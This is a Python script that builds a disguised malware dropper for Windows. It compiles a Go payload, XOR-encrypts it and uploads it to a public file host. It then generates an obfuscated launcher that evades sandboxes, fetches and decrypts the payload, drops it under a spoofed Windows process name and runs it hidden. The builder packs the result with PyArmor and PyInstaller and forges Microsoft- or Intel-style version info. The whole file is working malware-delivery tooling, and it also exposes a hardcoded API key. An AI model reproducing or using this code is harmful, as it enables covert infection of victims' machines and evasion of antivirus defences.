#!/usr/bin/env python3
"""
Go Payload Builder — CLI-only, auto-builds main.go in current directory.
"""
import sys
import os
import base64
import subprocess
import tempfile
import requests
import random
import string
import shutil
import time
import textwrap

# Legitimate-looking drop filenames (pick one at random per build)
DROP_NAMES = [
    "RuntimeBroker", "SearchIndexer", "SecurityHealthService",
    "WmiPrvSE", "CompatTelRunner", "MpCmdRun", "dllhost",
    "conhost", "sihost", "taskhostw", "ctfmon", "fontdrvhost",
    "WUDFHost", "DeviceCensus", "MusNotification",
]


class LitterboxAPI:
    API_URL = "https://litterbox.catbox.moe/resources/internals/api.php"

    def __init__(self, retention="24h", retries=3, delay=5):
        self.retention = retention
        self.retries = retries
        self.delay = delay

    def upload(self, filepath):
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")

        for attempt in range(self.retries):
            try:
                with open(filepath, 'rb') as f:
                    files = {'fileToUpload': f}
                    data = {'reqtype': 'fileupload', 'time': self.retention}
                    resp = requests.post(self.API_URL, data=data, files=files, timeout=60)
                    resp.raise_for_status()
                    result = resp.text.strip()
                    if result.startswith("http"):
                        return result
                    raise Exception(f"Invalid response: {result}")
            except Exception:
                if attempt < self.retries - 1:
                    time.sleep(self.delay)
                else:
                    raise
        raise Exception("Upload failed")


class Obfuscator:
    @staticmethod
    def generate_key(length=32):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    @staticmethod
    def xor_encode_bytes(data_bytes, key):
        key_bytes = key.encode('utf-8')
        result = bytearray()
        for i, b in enumerate(data_bytes):
            result.append(b ^ key_bytes[i % len(key_bytes)])
        return bytes(result)

    @staticmethod
    def rand_var(prefix="v"):
        return f"_{prefix}{''.join(random.choices(string.ascii_lowercase, k=8))}"

    @staticmethod
    def split_string_to_chunks(s, min_chunk=3, max_chunk=8):
        chunks = []
        i = 0
        while i < len(s):
            size = random.randint(min_chunk, max_chunk)
            chunks.append(s[i:i + size])
            i += size
        return chunks

    @staticmethod
    def encode_string_as_chr_mix(s):
        parts = []
        i = 0
        while i < len(s):
            if random.random() < 0.4:
                parts.append(f"chr({ord(s[i])})")
                i += 1
            else:
                end = min(i + random.randint(2, 5), len(s))
                parts.append(repr(s[i:end]))
                i = end
        return " + ".join(parts)

    @staticmethod
    def generate_junk_lines(count=8):
        lines = []
        templates = [
            lambda v: f"{v} = sum(range({random.randint(10,200)}))",
            lambda v: f"{v} = [x * {random.randint(2,9)} for x in range({random.randint(5,30)})]",
            lambda v: f"{v} = {{k: k * {random.randint(2,7)} for k in range({random.randint(3,15)})}}",
            lambda v: f"{v} = len(str({random.randint(100000,999999)}))",
            lambda v: f"{v} = hash(({random.randint(1,999)}, {random.randint(1,999)}))",
            lambda v: f"{v} = {random.randint(1,500)} ** 2 - {random.randint(1,500)}",
            lambda v: f"{v} = bool({random.randint(0,1)})",
            lambda v: f"{v} = list(reversed(range({random.randint(5,20)})))",
        ]
        for _ in range(count):
            v = Obfuscator.rand_var("jnk")
            lines.append(random.choice(templates)(v))
        return lines


class URLShortener:
    @staticmethod
    def shorten(url):
        api = "https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten"
        headers = {
            "Content-Type": "application/json",
            "x-api-key": "listentosmokeforever"
        }
        try:
            resp = requests.post(api, json={"url": url}, headers=headers, timeout=15)
            resp.raise_for_status()
            return resp.json().get("raw_url", url)
        except Exception:
            return url


def log(msg, level="INFO"):
    prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]"}[level]
    print(f"{prefix} {msg}")


def stage_compile_payload(raw_payload, enc_key, litterbox, xor=True):
    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = os.path.join(tmpdir, "payload.go")
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(raw_payload)

        log("Initializing Go module...")
        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
        subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)

        out_path = os.path.join(tmpdir, "payload.exe")
        env = os.environ.copy()
        env["GOOS"] = "windows"
        env["GOARCH"] = "amd64"
        env["CGO_ENABLED"] = "0"

        log("Compiling (GOOS=windows, stripped, windowsgui)...")
        build = subprocess.run(
            ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "payload.go"],
            cwd=tmpdir, capture_output=True, text=True, env=env
        )
        if build.returncode != 0:
            raise Exception(f"Go build failed:\n{build.stderr}")

        with open(out_path, "rb") as f:
            bin_data = f.read()
        log(f"Compiled binary: {len(bin_data)} bytes", "OK")

        if xor:
            bin_data = Obfuscator.xor_encode_bytes(bin_data, enc_key)
            log("XOR encrypted payload", "OK")

        enc_path = os.path.join(tmpdir, "payload.bin")
        with open(enc_path, "wb") as f:
            f.write(bin_data)

        url = litterbox.upload(enc_path)
        log("Payload uploaded to staging", "OK")
        return url


def stage_generate_launcher(payload_url, enc_key, sandbox=True):
    key = enc_key
    v_url = Obfuscator.rand_var("u")
    v_key = Obfuscator.rand_var("k")
    v_data = Obfuscator.rand_var("d")
    v_dec = Obfuscator.rand_var("r")
    v_path = Obfuscator.rand_var("p")
    v_i = Obfuscator.rand_var("i")
    v_req = Obfuscator.rand_var("q")
    v_resp = Obfuscator.rand_var("s")
    v_info = Obfuscator.rand_var("si")

    url_chunks = Obfuscator.split_string_to_chunks(payload_url)
    url_expr = " + ".join(repr(c) for c in url_chunks)
    key_expr = Obfuscator.encode_string_as_chr_mix(key)
    drop_name = random.choice(DROP_NAMES) + ".exe"

    junk_top = Obfuscator.generate_junk_lines(random.randint(5, 10))
    junk_mid = Obfuscator.generate_junk_lines(random.randint(3, 7))

    sandbox_block = ""
    if sandbox:
        v_sc = Obfuscator.rand_var("sc")
        v_mc = Obfuscator.rand_var("mc")
        v_up = Obfuscator.rand_var("up")
        v_dt = Obfuscator.rand_var("dt")
        sandbox_block = textwrap.dedent(f"""\
            import multiprocessing as {v_mc}
            import ctypes as {v_sc}
            {v_up} = {v_sc}.windll.kernel32.GetTickCount64() if hasattr({v_sc}, 'windll') else 999999999
            if {v_mc}.cpu_count() < 2:
                raise SystemExit
            if {v_up} < 600000:
                raise SystemExit
            {v_dt} = __import__('datetime')
            if ({v_dt}.datetime.now() - {v_dt}.datetime(2020, 1, 1)).days < 100:
                raise SystemExit
        """)

    sleep_secs = round(random.uniform(1.5, 4.0), 2)

    script = textwrap.dedent(f"""\
        import os as _os
        import subprocess as _sp
        import time as _tm
        import urllib.request as _ur
        {chr(10).join(junk_top)}
        {sandbox_block}
        _tm.sleep({sleep_secs})
        {chr(10).join(junk_mid)}
        {v_url} = {url_expr}
        {v_key} = {key_expr}
        {v_req} = _ur.Request({v_url})
        {v_req}.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        {v_resp} = _ur.urlopen({v_req}, timeout=30)
        {v_data} = {v_resp}.read()
        {v_dec} = bytearray(len({v_data}))
        for {v_i} in range(len({v_data})):
            {v_dec}[{v_i}] = {v_data}[{v_i}] ^ ord({v_key}[{v_i} % len({v_key})])
        {v_path} = _os.path.join(_os.environ.get("APPDATA", _os.environ.get("TEMP", ".")), "{drop_name}")
        with open({v_path}, "wb") as _f:
            _f.write(bytes({v_dec}))
        {v_info} = _sp.STARTUPINFO()
        {v_info}.dwFlags |= _sp.STARTF_USESHOWWINDOW
        {v_info}.wShowWindow = 0
        _sp.Popen({v_path}, startupinfo={v_info}, creationflags=0x08000000)
    """)

    tmpdir = tempfile.mkdtemp()
    script_path = os.path.join(tmpdir, "launcher.py")
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    log(f"Launcher generated ({len(script)} chars, vars randomized)", "OK")
    log(f"Drop name: {drop_name}")
    if sandbox:
        log("Sandbox evasion checks embedded", "OK")
    return script_path, tmpdir


def stage_pyarmor(script_path, tmpdir):
    log("Running PyArmor obfuscation...")
    obf_dir = os.path.join(tmpdir, "obf")
    res = subprocess.run(
        ["pyarmor", "gen", "-O", obf_dir, script_path],
        capture_output=True, text=True
    )
    if res.returncode != 0:
        log(f"PyArmor failed (continuing without): {res.stderr.strip()}", "WARN")
        return None
    log("PyArmor obfuscation complete", "OK")
    return os.path.join(obf_dir, "launcher.py")


def stage_version_info(tmpdir, output_name):
    clean_name = output_name.replace(".exe", "")
    company_names = [
        "Microsoft Corporation", "Intel Corporation",
        "NVIDIA Corporation", "Realtek Semiconductor Corp.",
        "Synaptics Incorporated", "Qualcomm Technologies, Inc.",
    ]
    descriptions = [
        "System Runtime Broker", "Windows Update Service Helper",
        "Display Configuration Utility", "Network Connectivity Assistant",
        "Hardware Compatibility Telemetry", "Security Health Monitor",
    ]
    company = random.choice(company_names)
    desc = random.choice(descriptions)
    major = random.randint(6, 10)
    minor = random.randint(0, 3)
    patch = random.randint(0, 9999)
    build_n = random.randint(1, 99999)

    version_info = textwrap.dedent(f"""\
        VSVersionInfo(
          ffi=FixedFileInfo(
            filevers=({major}, {minor}, {patch}, {build_n}),
            prodvers=({major}, {minor}, {patch}, {build_n}),
            mask=0x3f,
            flags=0x0,
            OS=0x40004,
            fileType=0x1,
            subtype=0x0,
            date=(0, 0)
          ),
          kids=[
            StringFileInfo([
              StringTable('040904B0', [
                StringStruct('CompanyName', '{company}'),
                StringStruct('FileDescription', '{desc}'),
                StringStruct('FileVersion', '{major}.{minor}.{patch}.{build_n}'),
                StringStruct('InternalName', '{clean_name}'),
                StringStruct('LegalCopyright', 'Copyright (C) {company}'),
                StringStruct('OriginalFilename', '{clean_name}.exe'),
                StringStruct('ProductName', '{desc}'),
                StringStruct('ProductVersion', '{major}.{minor}.{patch}.{build_n}'),
              ])
            ]),
            VarFileInfo([VarStruct('Translation', [0x0409, 0x04B0])])
          ]
        )
    """)

    version_path = os.path.join(tmpdir, "version_info.txt")
    with open(version_path, "w", encoding="utf-8") as f:
        f.write(version_info)

    log(f"Version info: {desc} by {company} v{major}.{minor}.{patch}", "OK")
    return version_path


def stage_pyinstaller(final_script, tmpdir, output_name, version_file=None, hidden=True, padding=False):
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    cwd = os.getcwd()
    log("Running PyInstaller...")

    pyinstaller_args = [
        "pyinstaller",
        "--onefile",
        "--clean",
        "-y",
        "-n", output_name.replace(".exe", ""),
        "--distpath", cwd,
    ]

    if hidden:
        pyinstaller_args.append("--noconsole")

    if version_file and os.path.exists(version_file):
        pyinstaller_args.extend(["--version-file", version_file])

    pyinstaller_args.append(final_script)

    res = subprocess.run(pyinstaller_args, capture_output=True, text=True, cwd=tmpdir)

    if res.returncode != 0:
        log(f"PyInstaller stderr: {res.stderr[-500:]}", "ERR")

    final_exe_path = os.path.join(cwd, output_name)

    if padding and os.path.exists(final_exe_path):
        current = os.path.getsize(final_exe_path)
        target = 5 * 1024 * 1024
        if current < target:
            pad = target - current
            with open(final_exe_path, "ab") as f:
                f.write(os.urandom(pad))
            log(f"Padded to {target // (1024*1024)} MB (added {pad} bytes overlay)", "OK")

    if os.path.exists(final_exe_path):
        size = os.path.getsize(final_exe_path)
        log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
    else:
        log("EXE not found after build. Check AV quarantine.", "ERR")

    try:
        shutil.rmtree(tmpdir, ignore_errors=True)
    except Exception:
        pass


def main():
    go_file = os.path.join(os.getcwd(), "main.go")
    if not os.path.exists(go_file):
        log("main.go not found in current directory.", "ERR")
        sys.exit(1)

    with open(go_file, "r", encoding="utf-8") as f:
        raw_payload = f.read()
    log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")

    output_name = f"system_update_{random.randint(100,999)}.exe"
    enc_key = Obfuscator.generate_key()
    litterbox = LitterboxAPI(retention="24h")

    log(f"Output: {output_name}")
    log(f"XOR Key: {enc_key}")
    print()

    try:
        # STAGE 1: Compile, encrypt, upload
        log("--- Stage 1: Compile & Encrypt Payload ---")
        payload_url = stage_compile_payload(raw_payload, enc_key, litterbox)

        # STAGE 2: Shorten URL
        log("\n--- Stage 2: Shorten Payload URL ---")
        short_url = URLShortener.shorten(payload_url)
        log("Shortened URL ready", "OK")

        # STAGE 3: Generate obfuscated launcher
        log("\n--- Stage 3: Generate Obfuscated Launcher ---")
        script_path, tmpdir = stage_generate_launcher(short_url, enc_key)

        # STAGE 4: PyArmor
        log("\n--- Stage 4: PyArmor Obfuscation ---")
        final_script = stage_pyarmor(script_path, tmpdir) or script_path

        # STAGE 5: Version info
        log("\n--- Stage 5: Generate Version Manifest ---")
        version_file = stage_version_info(tmpdir, output_name)

        # STAGE 6: PyInstaller
        log("\n--- Stage 6: PyInstaller Build ---")
        stage_pyinstaller(final_script, tmpdir, output_name, version_file)

        print()
        log("=== Pipeline Complete ===", "OK")
    except Exception as e:
        log(f"Stopped: {e}", "ERR")
        sys.exit(1)


if __name__ == "__main__":
    main()
